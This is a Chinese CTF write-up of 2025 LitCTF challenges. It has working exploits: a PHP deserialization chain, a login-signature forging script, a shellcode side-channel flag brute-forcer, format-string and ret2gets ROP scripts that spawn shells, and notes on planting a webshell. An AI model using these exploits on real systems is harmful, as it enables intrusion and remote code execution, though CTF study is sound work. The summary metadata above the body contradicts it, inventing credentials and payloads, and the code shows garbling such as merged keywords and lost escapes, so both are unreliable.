---
title: 2025 LitCTF writeup by Mini-Venom（NestJS 爆破 + 多重宇宙日记原型链污染 + 星愿信箱 SSTI）
contest: 2025 LitCTF
year: 2025
difficulty: medium
vuln_type:
- web_unknown
- ssti
- deserialize
- auth_bypass
tags:
- LitCTF nest_js 爆破 admin:password
- 星愿信箱 {{ 过滤 SSTI
- 多重宇宙日记 settings update JSON 解析
- /api/profile/update POST 任意 settings 字段
- settingsPayload 构造原型链污染
- 升级 isAdmin=true
attack_chain:
- 'nest_js: admin/password 爆破登入即得 flag'
- '星愿信箱: 过滤 {{ 的 SSTI，需绕括号/下划线'
- '多重宇宙日记: 注册 a/a 登入 → 个人资料源代码 → /api/profile/update'
- '构造 JSON {"settings": {"theme": ..., "isAdmin": true, ...}} 注入管理员'
- 设置 isAdmin=true 后 page reload 看导航栏 admin 菜单 → 拿 flag
key_payload: settingsPayload.isAdmin = true → setTimeout(reload, 1000) → page reload 拿 flag
one_liner: 2025 LitCTF Web 三题：NestJS admin 弱密码爆破 + SSTI 绕 {{ 过滤 + 多重宇宙日记 settings JSON 注入 isAdmin=true 提权。
lesson: settings 类 JSON 接口常见原型链污染：把 admin 权限字段注入到 settings 后端会被 merge 到 user 对象 → 提权；SSTI 过滤 `{{` 时可考虑 `${ }` 或 `{% %}` 或 `#{ }`。
quality: medium
full_path: 2025_LitCTF_writeup_by_Mini-Venom.full.md
meta_path: 2025_LitCTF_writeup_by_Mini-Venom.meta.md
images_removed: true
images_removed_count: 10
schema_version: v3.0.0-P0
summary: '2025 LitCTF writeup by Mini-Venom（NestJS 爆破 + 多重宇宙日记原型链污染 + 星愿信箱 SSTI）。2025 LitCTF Web 三题：NestJS admin 弱密码爆破 + SSTI 绕 {{ 过滤 + 多重宇宙日记 settings JSON 注入 isAdmin=true 提权。。关键路径：nest_js: admin/password 爆...'
category: web
subcategory: web_other
subcategories:
- web_other
- ssti
- deserialization
- logic
time_required: medium
difficulty_score: 3
code_blocks_count: 2
images_count: 10
last_verified: 2026-09-20
contest_type: open
wp_url: https://www.ctfiot.com/250466.html
wp_author: Mini-Venom
reasoning_chain:
- '[触发点] 多重宇宙日记原型链污染 + /api/profile/update 接受 JSON settings → 假设：__proto__ 注入 isAdmin=true → [动作] POST JSON { ''__proto__'': { ''isAdmin'': true } } → [观察] settings merge 到 user 对象后提权'
- '[触发点] NestJS admin 弱密码爆破 → 假设：admin:admin 或 admin:password → [动作] Hydra / patator 爆破 → [观察] admin:admin 登录成功'
- '[触发点] SSTI 题过滤 {{ 但允许 #{} 或 ${ } → 假设：Thymeleaf SSTI 绕 {{ 过滤 → [动作] payload = ${T(java.lang.Runtime).getRuntime().exec(''cat /flag'')} → [观察] RCE'
- '[触发点] 君の名は create_function('''', ''die(/readflag);'') → 假设：PHP 反序列化触发 create_function → [动作] O:a:... → unserialize($Litctf2025) → [观察] 触发 __unserialize 链'
- '[触发点] unserialize 黑名单 ^[Oa]:[d]+/i 过滤 O → 假设：把 O 改成 C 绕过 → [动作] C:14:"Taki":... → [观察] 反序列化成功'
- '[触发点] 多重宇宙日记原型链污染 + /api/profile/update → 假设：__proto__ 注入 isAdmin=true → [动作] POST JSON { ''__proto__'': { ''isAdmin'': true } } → [观察] settings merge 到 user 对象后提权'
- '[触发点] NestJS admin 弱密码爆破 → 假设：admin:admin → [动作] Hydra / patator 爆破 → [观察] admin:admin 登录成功'
- '[触发点] SSTI 题过滤 {{ 但允许 #{} 或 ${ } → 假设：Thymeleaf SSTI 绕 {{ 过滤 → [动作] payload = ${T(java.lang.Runtime).getRuntime().exec(''cat /flag'')} → [观察] RCE'
- '[触发点] 君の名は create_function('''', ''die(/readflag);'') → 假设：PHP 反序列化触发 create_function → [动作] O:a:... → unserialize($Litctf2025) → [观察] 触发 __unserialize 链'
failed_attempts:
- 试图用普通 JSON 注入 isAdmin → 失败：必须用 __proto__ 原型链污染
- 试图用 {{7*7}} SSTI → 失败：被过滤
- 试图用 O 开头的序列化串 → 失败：被正则过滤，把 O 改成 C 即可
key_observations:
- settings 类 JSON 接口常见原型链污染：把 admin 权限字段注入到 settings 后端会被 merge 到 user 对象 → 提权
- SSTI 过滤 `{{` 时可考虑 `${ }` 或 `{% %}` 或 `#{ }`
- 'PHP 反序列化绕过黑名单：把 O: 改成 C: 触发 __unserialize'
- create_function('', 'die(/readflag)') 是 2025 高频 PHP 反序列化触发点
prerequisites:
- JavaScript 原型链污染（__proto__）
- Thymeleaf/SSTI 模板注入绕过
- PHP 反序列化绕过正则黑名单
- NestJS 弱密码爆破（hydra/patator）
---
# 2025 LitCTF writeup by Mini-Venom

> 原文: https://www.ctfiot.com/250466.html
> ID: 250466

招新小广告CTF组诚招re、crypto、pwn、misc、合约方向的师傅,长期招新IOT+Car+工控+样本分析多个组招人有意向的师傅请联系邮箱 admin@chamd5.org(带上简历和想加入的小组)  

Web

nest_js

爆破账号密码，admin:
password

登入就有flag
image-20250525154914269

星愿信箱

过滤了{{的ssti
image-20250525155244988

多重宇宙日记

注册账号a,a,登入在个人资料处看源代码

        // 更新表单的JS提交
         document.getElementById('profileUpdateForm').addEventListener('submit', async      function(event) {
            event.preventDefault();
            const statusEl = document.getElementById('updateStatus');
            const currentSettingsEl = document.getElementById('currentSettings');
            statusEl.textContent = '正在更新...';

            const formData = new FormData(event.target);
            const settingsPayload = {};
            // 构建 settings 对象，只包含有值的字段
            if (formData.get('theme')) settingsPayload.theme = formData.get('theme');
            if (formData.get('language')) settingsPayload.language =                   formData.get('language');
            // ...可以添加其他字段

            try {
                const response = await fetch('/api/profile/update', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({ settings: settingsPayload }) // 包装在                   "settings"键下
                });
                const result = await response.json();
                if (response.ok) {
                    statusEl.textContent = '成功: ' + result.message;
                    currentSettingsEl.textContent = JSON.stringify(result.settings, null,       2);
                    // 刷新页面以更新导航栏（如果isAdmin状态改变）
                    setTimeout(() =>window.location.reload(), 1000);
                } else {
                    statusEl.textContent = '错误: ' + result.message;
                }
            } catch (error) {
                statusEl.textContent = '请求失败: ' + error.toString();
            }
        });

        // 发送原始JSON的函数
        asyncfunction sendRawJson() {
            const rawJson = document.getElementById('rawJsonSettings').value;
            const statusEl = document.getElementById('rawJsonStatus');
            const currentSettingsEl = document.getElementById('currentSettings');
            statusEl.textContent = '正在发送...';
            try {
                const parsedJson = JSON.parse(rawJson); // 确保是合法的JSON
                const response = await fetch('/api/profile/update', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify(parsedJson) // 直接发送用户输入的JSON
                });
                const result = await response.json();
                if (response.ok) {
                    statusEl.textContent = '成功: ' + result.message;
                    currentSettingsEl.textContent = JSON.stringify(result.settings, null, 2);
                     // 刷新页面以更新导航栏（如果isAdmin状态改变）
                    setTimeout(() =>window.location.reload(), 1000);
                } else {
                    statusEl.textContent = '错误: ' + result.message;
                }
            } catch (error) {
                 statusEl.textContent = '请求失败或JSON无效: ' + error.toString();
            }
        }

因为题目说考原型链污染，根据源码的要求的格式，构造如下payload
image-20250525155655270
image-20250525155825734

easy_file

又是爆破账号密码，admin:
password,发现是文件上传,测试过滤了<?php,换成<?就可以
image-20250525160347128

在admin.php下可以存在file参数可以任意文件读取（根据题目名猜的，难绷），并且是include，那么说明读取的文件会被当成php文件执行。
image-20250525160937310

君の名は

 <?php
highlight_file(__FILE__);
error_reporting(0);
create_function("", 'die(`/readflag`);');
class Taki
{
    private $musubi;
    private $magic;
    publicfunction __unserialize(array $data)
    {
        $this->musubi = $data['musubi'];
        $this->magic = $data['magic'];
        return ($this->musubi)();
    }
    publicfunction __call($func,$args){
        (new $args[0]($args[1]))->{$this->magic}();
    }
}

class Mitsuha
{
    private $memory;
    private $thread;
    publicfunction __invoke()
    {
        return$this->memory.$this->thread;
    }
}

class KatawareDoki
{
    private $soul;
    private $kuchikamizake;
    private $name;

    publicfunction __toString()
    {
        ($this->soul)->flag($this->kuchikamizake,$this->name);
        return"call error!no flag!";
    }
}

$Litctf2025 = $_POST['Litctf2025'];
if(!preg_match("/^[Oa]:[d]+/i", $Litctf2025)){
    unserialize($Litctf2025);
}else{
    echo"把O改成C不就行了吗,笨蛋!～(∠・ω< )⌒☆";
} 

利用点就在create_function("", 'die(/readflag);');，他会生成一个匿名函数，我们的目的就是去掉用这个匿名函数，第一关参考https://chenxi9981.github.io/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/

exp:

<?php

class Taki
{
public $musubi;
public $magic;
}

class Mitsuha
{
public $memory;
public $thread;
}

class KatawareDoki

{
public $soul;
public $kuchikamizake;
public $name;
}

$a=new Taki();
$a->musubi=new Mitsuha();
$a->musubi->memory=new KatawareDoki();
$a->musubi->memory->kuchikamizake="ReflectionFunction";
$a->musubi->memory->name=" 0lambda_50";
$a->musubi->memory->soul=new Taki();
$a->musubi->memory->soul->musubi='time';
$a->musubi->memory->soul->magic="invoke";
$aa=new Arrayobject($a);
$payload=serialize($aa);
$payload=str_replace(" 0","%00",$payload);
echo $payload;

image-20250525171106360

easy_signin

扫描目录得到login.html，在源码处看到/api.js,得到/api/sys/urlcode.php?url=，不知道有什么用，尝试登入，输入admin显示密码错误，爆破密码为admin123，显示签名错误

login.html的登入逻辑

   const loginBtn = document.getElementById('loginBtn');
        const passwordInput = document.getElementById('password');
        const errorTip = document.getElementById('errorTip');
        const rawUsername = document.getElementById('username').value; 

     
        loginBtn.addEventListener('click', async () => {
            const rawPassword = passwordInput.value.trim();
            if (!rawPassword) {
                errorTip.textContent = '请输入密码';
                errorTip.classList.add('show');
                passwordInput.focus();
                return;
            }

            const md5Username = CryptoJS.MD5(rawUsername).toString();   
            const md5Password = CryptoJS.MD5(rawPassword).toString();   

     
            const shortMd5User = md5Username.slice(0, 6);  
            const shortMd5Pass = md5Password.slice(0, 6);  

          
            const timestamp = Date.now().toString(); //五分钟

       
            const secretKey = 'easy_signin';  
            const sign = CryptoJS.MD5(shortMd5User + shortMd5Pass + timestamp +       secretKey).toString();

            try {
                const response = await fetch('login.php', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/x-www-form-urlencoded',
                        'X-Sign': sign  
                    },
                    body: new URLSearchParams({
                        username: md5Username,   
                        password: md5Password,   
                        timestamp: timestamp
                    })
                });

                const result = await response.json();
                if (result.code === 200) {
                    alert('登录成功！');
                    window.location.href = 'dashboard.php'; 
                } else {
                    errorTip.textContent = result.msg;
                    errorTip.classList.add('show');
                    passwordInput.value = '';
                    passwordInput.focus();
                    setTimeout(() => errorTip.classList.remove('show'), 3000);
                }
            } catch (error) {
                errorTip.textContent = '网络请求失败';
                errorTip.classList.add('show');
                setTimeout(() => errorTip.classList.remove('show'), 3000);
            }
        });

        passwordInput.addEventListener('input', () => {
            errorTip.classList.remove('show');
        });

发现还需要爆破时间戳，exp

import hashlib
import time
import requests

# 目标地址
url = "http://node9.anna.nssctf.cn:
23017/login.php"# ← 改成你的实际地址

# 固定信息
username = "admin"
password = "admin123"
secret_key = "easy_signin"

# 当前时间戳（单位：毫秒）
timestamp = str(int(time.time() * 1000))

# 加密处理
md5_username = hashlib.md5(username.encode()).hexdigest()
md5_password = hashlib.md5(password.encode()).hexdigest()

short_md5_user = md5_username[:6]
short_md5_pass = md5_password[:6]

sign_raw = short_md5_user + short_md5_pass + timestamp + secret_key
sign = hashlib.md5(sign_raw.encode()).hexdigest()

# 构造请求头和数据
headers = {
    "X-Sign": sign
}

data = {
    "username": md5_username,
    "password": md5_password,
    "timestamp": timestamp
}

# 发起请求
response = requests.post(url, headers=headers, data=data)

try:
    print("[响应状态码]:", response.status_code)
    print("[响应内容]:", response.text)
    print(timestamp)
    print(sign)
except Exception as e:
    print("[错误]:", e)

for key, value in response.headers.items():
    print(f"{key}: {value}")

image-20250525172233323

成功,浏览器放包得到文件，访问
image-20250525172552714

想到前面的/api/sys/urlcode.php?url=，尝试

/api/sys/urlcode.php？url=127.0.0.1/backup/8e0132966053d4bf8b2dbe4ede25502b.php

image-20250525172721996

可以执行命令，不能有空格尝试${IFS},没找到flag，尝试写马
1c9b20cc39c9d40e8dc4dfa39bb96215

上蚁剑
image-20250525172906308

pwn

test_your_nc

签到题
d8be4818c4852450eeec8d8d77f5ad7

shellcode

题目直接执行shellcode
image

只允许使用read+open，测信道爆破flag
image

from pwn import *
from struct import pack
import time
import random
import ctypes
#from LibcSearcher import *
from ae64 import AE64

def bug():
    gdb.attach(p)
    pause()

def s(a):
    p.send(a)

def sa(a,b):
    p.sendafter(a,b)

def sl(a):
    p.sendline(a)

def sla(a,b):
    p.sendlineafter(a,b)

def r(a):
    return p.recv(a, timeout=1)

def rl(a):
    return p.recvuntil(a, timeout=1)

def inter():
    p.interactive()

def get_addr(size):
    return u64(p.recv(size).ljust(8,b'x00'))

def get_addr64():
    return u64(p.recvuntil("x7f")[-6:].ljust(8,b'x00'))

def get_addr32():
    return u32(p.recvuntil("xf7")[-4:])

def get_sb():
    return libc_base+libc.sym['system'],libc_base+libc.search(b"/bin/shx00").__next__()

def get_hook():
    return libc_base+libc.sym['__malloc_hook'],libc_base+libc.sym['__free_hook']

li = lambda x : print('x1b[01;38;5;214m' + x + 'x1b[0m')
ll = lambda x : print('x1b[01;38;5;1m' + x + 'x1b[0m')

def log_info(message, status=None):
    color_codes = {
        'success': ' 33[92m',
        'error': ' 33[91m',
        'warning': ' 33[93m',
        None: ' 33[95m'
    }
    color = color_codes.get(status, ' 33[95m')
    print(f"{color}[*] {message} 33[0m")

def get_random_delay():
    return random.uniform(0.1, 0.5)

context(os='linux', arch='amd64', log_level='error')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
elf = ELF('./pwn')

# 完整字符集
full_charset = "{}0123456789-_abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"

# 直接在此处设置已知前缀（修改此行即可）
FLAG_PREFIX = "flag{"  # <-- 在此处修改前缀

if not FLAG_PREFIX:
    log_info("未设置前缀，将使用完整字典爆破", 'warning')
    initial_index = 0
else:
    initial_index = len(FLAG_PREFIX)
    log_info(f"将从位置 {initial_index} 开始爆破，前缀: {FLAG_PREFIX}", 'success')

s = full_charset
char_list = [ord(x) for x in s]
flag = FLAG_PREFIX  # 初始化flag为预设前缀

shellcode = """
mov rdi, 0x67616c662f2e
push rdi
mov rdi, rsp
mov rsi, 0
mov rdx, 0
mov rax, 2
syscall

mov rdi, 3
mov rsi, rsp
mov rdx, 0x100
mov rax, 0
syscall

mov bl, byte ptr [rsp+{}]
cmp bl, {}
jz $-0x3 
"""

index = initial_index
MAX_RETRY = 5
MAX_CONSECUTIVE_FAILURES = 10
consecutive_failures = 0

while True:
    if consecutive_failures >= MAX_CONSECUTIVE_FAILURES:
        log_info("检测到信道不稳定，暂停5秒后重试", 'warning')
        time.sleep(5)
        consecutive_failures = 0

    for i in range(len(s)):
        retry_count = MAX_RETRY
        success = False

        while retry_count > 0 and not success:
            time.sleep(get_random_delay())

            try:
                # 切换本地/远程模式
                p = process('./pwn')
                #p = remote('node8.anna.nssctf.cn', 22581)

                payload = asm(shellcode.format(index, char_list[i]))
                sla(b'Please input your shellcode: n', payload)

                try:
                    judge = rl(b'n')
                
except (EOFError, TimeoutError):
                    log_info(f"字符 {s[i]} 导致连接关闭，重试 ({MAX_RETRY-retry_count+1}/{MAX_RETRY})", 'warning')
                    retry_count -= 1
                    consecutive_failures += 1
                    p.close()
                    continue

                if len(judge) < 3:
                    flag += s[i]
                    log_info(f"找到字符: {s[i]}, 当前flag: {flag}", 'success')
                    index += 1
                    success = True
                    consecutive_failures = 0

                p.close()

            
except Exception as e:
                log_info(f"连接异常: {str(e)}，剩余重试: {retry_count}", 'error')
                retry_count -= 1
                consecutive_failures += 1
                if p:
                    p.close()
            finally:
                if p:
                    p.close()

        if success:
            break

    if '}' in flag:
        log_info(f"最终flag: {flag}", 'success')
        exit(0)

inter()    

onlyone

详细的就参考这篇文章

https://xz.aliyun.com/news/17965

这道题也就是模仿的当时强网拟态的那道题目，基本上一摸一样，利用一次fmt打一次指针跳板

劫持返回地址为main， 从而实现多次fmt的机会，然后将printf的返回地址+8的地方改为ogg，最后将printf的返回地址改为ret，触发ogg，getshel

l

from pwn import*
from struct import pack
import ctypes
#from LibcSearcher import *
from ae64 import AE64
def bug():
	gdb.attach(p)
	pause()
def s(a):
	p.send(a)
def sa(a,b):
	p.sendafter(a,b)
def sl(a):
	p.sendline(a)
def sla(a,b):
	p.sendlineafter(a,b)
def r(a):
	p.recv(a)
#def pr(a):
	#print(p.recv(a))
def rl(a):
	return p.recvuntil(a)
def inter():
	p.interactive()
def get_addr(size):
	return u64(p.recv(size).ljust(8,b'x00'))
def get_addr64():
	return u64(p.recvuntil("x7f")[-6:].ljust(8,b'x00'))
def get_addr32():
	return u32(p.recvuntil("xf7")[-4:])
def get_sb():
	return libc_base+libc.sym['system'],libc_base+libc.search(b"/bin/shx00").__next__()
def get_hook():
	return libc_base+libc.sym['__malloc_hook'],libc_base+libc.sym['__free_hook']
li = lambda x : print('x1b[01;38;5;214m' + x + 'x1b[0m')
ll = lambda x : print('x1b[01;38;5;1m' + x + 'x1b[0m')

#context(os='linux',arch='i386',log_level='debug')   
context(os='linux',arch='amd64',log_level='debug')
libc=ELF('./libc-2.31.so')   

elf=ELF('./fmt')
#p=remote('',)
p = process('./fmt')
rl(b'0x')
stack=int(p.recv(12),16)
li(hex(stack))
rl(b'0x')
libc_base=int(p.recv(12),16)-libc.sym['puts']
li(hex(libc_base))
ogg=libc_base+0xe3b01
addr=(stack&0xffff)-15
payload  = b'%p'*9
payload += b'%'+str(addr - 92).encode()+b'c%hn'#11
payload += b'%'+str(0x10007b-addr).encode()+b'c%39$hhn'
#bug()
s(payload)
add=(stack+17-0x18)&0xffff
li(hex(add))
sleep(0.5)
payload = b'%'+str(0x7b).encode()+b'c%39$hhn'
payload+= b'%'+str(add-0x7b).encode()+b'c%27$hn'
payload =payload.ljust(0x100,b'x00')
#bug()
s(payload)

sleep(0.5)
payload = b'%'+str(0x7b).encode()+b'c%39$hhn'
payload+= b'%'+str((ogg&0xffff)-0x7b).encode()+b'c%41$hn'
payload =payload.ljust(0x100,b'x00')
#bug()
s(payload)

sleep(0.5)
payload = b'%'+str(0x7b).encode()+b'c%39$hhn'
payload+= b'%'+str(add+2-0x7b).encode()+b'c%27$hn'
payload =payload.ljust(0x100,b'x00')
#bug()
s(payload)

sleep(0.5)
payload = b'%'+str(0x7b).encode()+b'c%39$hhn'
payload+= b'%'+str((ogg>>16&0xffff)-0x7b).encode()+b'c%41$hn'
payload =payload.ljust(0x100,b'x00')
#bug()
s(payload)

sleep(0.5)
payload = b'%'+str(0x7b).encode()+b'c%39$hhn'
payload+= b'%'+str(add+2+2-0x7b).encode()+b'c%27$hn'
payload =payload.ljust(0x100,b'x00')
#bug()
s(payload)

sleep(0.5)
payload = b'%'+str(0x7b).encode()+b'c%39$hhn'
payload+= b'%'+str((ogg>>32)-0x7b).encode()+b'c%41$hn'
payload =payload.ljust(0x100,b'x00')
#bug()
s(payload)

payload = b'%'+str(0x069e).encode()+b'c%39$hn'
payload =payload.ljust(0x100,b'x00')
#bug()
s(payload)

#a=p.recvall()
#print(len(a)-1

inter()

master_of_rop

题目：
image

只存在一个gets，没有pop_rdi，如何去控制rdi呢，这里引入一种比较新颖的手法，ret2gets，在 gets 返回后，rdi 通常指向 _IO_stdfile_0_lock，这是一个 libc 中的可写地址。攻击者可以利用这一点，通过 ROP 链再次调用 gets，向 _IO_stdfile_0_lock 写入任意数据，具体原理会另外写一篇文章分析了，这里直接用了

第一个paylaod

payload = b'a'*(0x20)+p64(0)
payload+= p64(elf.plt['gets'])
payload+= p64(elf.plt['puts'])
payload+= p64(0x401100)+p64(0x4011AD)

控制返回地址为gets，往_IO_stdfile_0_lock写入(b"A" * 4 + b"x00"*3)，然后会泄露出TLS，由此计算偏移即可得到libc地址，通知控制返回地址为main，为了第二次打ROP链

这里可以直接用libc中的pop_rdi，也可以用ret2gets的paylaod，这里不能直接输入/bin/sh，调试发现第二个/被转换为. ，可以直接用$0或者

p.sendline(b"/bin" + p8(u8(b"/")+1) + b"sh")

from pwn import*
from struct import pack
import ctypes
#from LibcSearcher import *
from ae64 import AE64
def bug():
	gdb.attach(p)
	pause()
def s(a):
	p.send(a)
def sa(a,b):
	p.sendafter(a,b)
def sl(a):
	p.sendline(a)
def sla(a,b):
	p.sendlineafter(a,b)
def r(a):
	p.recv(a)
#def pr(a):
	#print(p.recv(a))
def rl(a):
	return p.recvuntil(a)
def inter():
	p.interactive()
def get_addr(size):
	return u64(p.recv(size).ljust(8,b'x00'))
def get_addr64():
	return u64(p.recvuntil("x7f")[-6:].ljust(8,b'x00'))
def get_addr32():
	return u32(p.recvuntil("xf7")[-4:])
def get_sb():
	return libc_base+libc.sym['system'],libc_base+libc.search(b"/bin/shx00").__next__()
def get_hook():
	return libc_base+libc.sym['__malloc_hook'],libc_base+libc.sym['__free_hook']
li = lambda x : print('x1b[01;38;5;214m' + x + 'x1b[0m')
ll = lambda x : print('x1b[01;38;5;1m' + x + 'x1b[0m')

#context(os='linux',arch='i386',log_level='debug')   
context(os='linux',arch='amd64',log_level='debug')
libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')   

elf=ELF('./pwn')
#p=remote('',)
p = process('./pwn')

rl("Welcome to LitCTF2025!")
payload = b'a'*(0x20)+p64(0)
payload+= p64(elf.plt['gets'])
payload+= p64(elf.plt['puts'])
payload+= p64(0x401100)+p64(0x4011AD)
#bug()
sl(payload)

#pause()
sleep(0.2)
p.sendline(b"A" * 4 + b"x00"*3)

p.recv(8)
p.recv(8)
tls = u64(p.recv(6) + b"x00x00")
li(hex(tls))
libc_base = tls -0x3a5740
li(hex(libc_base))
system,bin_sh=get_sb()

rl("Welcome to LitCTF2025!")
payload = b'a'*(0x20)+p64(0)
payload+= p64(elf.plt['gets'])
payload+= p64(system)

#bug()
sl(payload)

sleep(0.2)
#sl(b'$0x00')
p.sendline(b"/bin" + p8(u8(b"/")+1) + b"sh")
inter()

CRYPTO

basic

from Crypto.Util.number import long_to_bytes, inverse

n = 150624321883406825203208223877379141248303098639178939246561016555984711088281599451642401036059677788491845392145185508483430243280649179231349888108649766320961095732400297052274003269230704890949682836396267905946735114062399402918261536249386889450952744142006299684134049634061774475077472062182860181893
e = 65537
c = 22100249806368901850308057097325161014161983862106732664802709096245890583327581696071722502983688651296445646479399181285406901089342035005663657920475988887735917901540796773387868189853248394801754486142362158369380296905537947192318600838652772655597241004568815762683630267295160272813021037399506007505

# Since n is prime, φ(n) = n - 1
phi_n = n - 1
d = inverse(e, phi_n)
m = pow(c, d, n)
flag = long_to_bytes(m)

print(flag.decode())
#LitCTF{ee2c30dfe684f13a6e6c07b9ec90cc2c}

ez_math

```python
from Crypto.Util.number import long_to_bytes, inverse

n = 150624321883406825203208223877379141248303098639178939246561016555984711088281599451642401036059677788491845392145185508483430243280649179231349888108649766320961095732400297052274003269230704890949682836396267905946735114062399402918261536249386889450952744142006299684134049634061774475077472062182860181893
e = 65537
c = 22100249806368901850308057097325161014161983862106732664802709096245890583327581696071722502983688651296445646479399181285406901089342035005663657920475988887735917901540796773387868189853248394801754486142362158369380296905537947192318600838652772655597241004568815762683630267295160272813021037399506007505

# Since n is prime, φ(n) = n - 1
phi_n = n - 1
d = inverse(e, phi_n)
m = pow(c, d, n)
flag = long_to_bytes(m)

print(flag.decode())
#LitCTF{ee2c30dfe684f13a6e6c07b9ec90cc2c}

math

题目给出了三个式子

结束

招新小广告

ChaMd5 Venom 招收大佬入圈

新成立组IOT+工控+样本分析 长期招新

欢迎联系admin@chamd5.org


```
// 更新表单的JS提交
         document.getElementById('profileUpdateForm').addEventListener('submit', async      function(event) {
            event.preventDefault();
            const statusEl = document.getElementById('updateStatus');
            const currentSettingsEl = document.getElementById('currentSettings');
            statusEl.textContent = '正在更新...';

            const formData = new FormData(event.target);
            const settingsPayload = {};
            // 构建 settings 对象，只包含有值的字段
            if (formData.get('theme')) settingsPayload.theme = formData.get('theme');
            if (formData.get('language')) settingsPayload.language =                   formData.get('language');
            // ...可以添加其他字段

            try {
                const response = await fetch('/api/profile/update', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({ settings: settingsPayload }) // 包装在                   "settings"键下
                });
                const result = await response.json();
                if (response.ok) {
                    statusEl.textContent = '成功: ' + result.message;
                    currentSettingsEl.textContent = JSON.stringify(result.settings, null,       2);
                    // 刷新页面以更新导航栏（如果isAdmin状态改变）
                    setTimeout(() =>window.location.reload(), 1000);
                } else {
                    statusEl.textContent = '错误: ' + result.message;
                }
            } catch (error) {
                statusEl.textContent = '请求失败: ' + error.toString();
            }
        });

        // 发送原始JSON的函数
        asyncfunction sendRawJson() {
            const rawJson = document.getElementById('rawJsonSettings').value;
            const statusEl = document.getElementById('rawJsonStatus');
            const currentSettingsEl = document.getElementById('currentSettings');
            statusEl.textContent = '正在发送...';
            try {
                const parsedJson = JSON.parse(rawJson); // 确保是合法的JSON
                const response = await fetch('/api/profile/update', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify(parsedJson) // 直接发送用户输入的JSON
                });
                const result = await response.json();
                if (response.ok) {
                    statusEl.textContent = '成功: ' + result.message;
                    currentSettingsEl.textContent = JSON.stringify(result.settings, null, 2);
                     // 刷新页面以更新导航栏（如果isAdmin状态改变）
                    setTimeout(() =>window.location.reload(), 1000);
                } else {
                    statusEl.textContent = '错误: ' + result.message;
                }
            } catch (error) {
                 statusEl.textContent = '请求失败或JSON无效: ' + error.toString();
            }
        }
<?php
highlight_file(__FILE__);
error_reporting(0);
create_function("", 'die(`/readflag`);');
class Taki
{
    private $musubi;
    private $magic;
    publicfunction __unserialize(array $data)
    {
        $this->musubi = $data['musubi'];
        $this->magic = $data['magic'];
        return ($this->musubi)();
    }
    publicfunction __call($func,$args){
        (new $args[0]($args[1]))->{$this->magic}();
    }
}

class Mitsuha
{
    private $memory;
    private $thread;
    publicfunction __invoke()
    {
        return$this->memory.$this->thread;
    }
}

class KatawareDoki
{
    private $soul;
    private $kuchikamizake;
    private $name;

    publicfunction __toString()
    {
        ($this->soul)->flag($this->kuchikamizake,$this->name);
        return"call error!no flag!";
    }
}

$Litctf2025 = $_POST['Litctf2025'];
if(!preg_match("/^[Oa]:[d]+/i", $Litctf2025)){
    unserialize($Litctf2025);
}else{
    echo"把O改成C不就行了吗,笨蛋!～(∠・ω< )⌒☆";
}
<?php

class Taki
{
public $musubi;
public $magic;
}

class Mitsuha
{
public $memory;
public $thread;
}

class KatawareDoki

{
public $soul;
public $kuchikamizake;
public $name;
}

$a=new Taki();
$a->musubi=new Mitsuha();
$a->musubi->memory=new KatawareDoki();
$a->musubi->memory->kuchikamizake="ReflectionFunction";
$a->musubi->memory->name=" 0lambda_50";
$a->musubi->memory->soul=new Taki();
$a->musubi->memory->soul->musubi='time';
$a->musubi->memory->soul->magic="invoke";
$aa=new Arrayobject($a);
$payload=serialize($aa);
$payload=str_replace(" 0","%00",$payload);
echo $payload;
const loginBtn = document.getElementById('loginBtn');
        const passwordInput = document.getElementById('password');
        const errorTip = document.getElementById('errorTip');
        const rawUsername = document.getElementById('username').value; 

     
        loginBtn.addEventListener('click', async () => {
            const rawPassword = passwordInput.value.trim();
            if (!rawPassword) {
                errorTip.textContent = '请输入密码';
                errorTip.classList.add('show');
                passwordInput.focus();
                return;
            }

            const md5Username = CryptoJS.MD5(rawUsername).toString();   
            const md5Password = CryptoJS.MD5(rawPassword).toString();   

     
            const shortMd5User = md5Username.slice(0, 6);  
            const shortMd5Pass = md5Password.slice(0, 6);  

          
            const timestamp = Date.now().toString(); //五分钟

       
            const secretKey = 'easy_signin';  
            const sign = CryptoJS.MD5(shortMd5User + shortMd5Pass + timestamp +       secretKey).toString();

            try {
                const response = await fetch('login.php', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/x-www-form-urlencoded',
                        'X-Sign': sign  
                    },
                    body: new URLSearchParams({
                        username: md5Username,   
                        password: md5Password,   
                        timestamp: timestamp
                    })
                });

                const result = await response.json();
                if (result.code === 200) {
                    alert('登录成功！');
                    window.location.href = 'dashboard.php'; 
                } else {
                    errorTip.textContent = result.msg;
                    errorTip.classList.add('show');
                    passwordInput.value = '';
                    passwordInput.focus();
                    setTimeout(() => errorTip.classList.remove('show'), 3000);
                }
            } catch (error) {
                errorTip.textContent = '网络请求失败';
                errorTip.classList.add('show');
                setTimeout(() => errorTip.classList.remove('show'), 3000);
            }
        });

        passwordInput.addEventListener('input', () => {
            errorTip.classList.remove('show');
        });
import hashlib
import time
import requests

# 目标地址
url = "http://node9.anna.nssctf.cn:
23017/login.php"# ← 改成你的实际地址

# 固定信息
username = "admin"
password = "admin123"
secret_key = "easy_signin"

# 当前时间戳（单位：毫秒）
timestamp = str(int(time.time() * 1000))

# 加密处理
md5_username = hashlib.md5(username.encode()).hexdigest()
md5_password = hashlib.md5(password.encode()).hexdigest()

short_md5_user = md5_username[:6]
short_md5_pass = md5_password[:6]

sign_raw = short_md5_user + short_md5_pass + timestamp + secret_key
sign = hashlib.md5(sign_raw.encode()).hexdigest()

# 构造请求头和数据
headers = {
    "X-Sign": sign
}

data = {
    "username": md5_username,
    "password": md5_password,
    "timestamp": timestamp
}

# 发起请求
response = requests.post(url, headers=headers, data=data)

try:
    print("[响应状态码]:", response.status_code)
    print("[响应内容]:", response.text)
    print(timestamp)
    print(sign)
except Exception as e:
    print("[错误]:", e)

for key, value in response.headers.items():
    print(f"{key}: {value}")
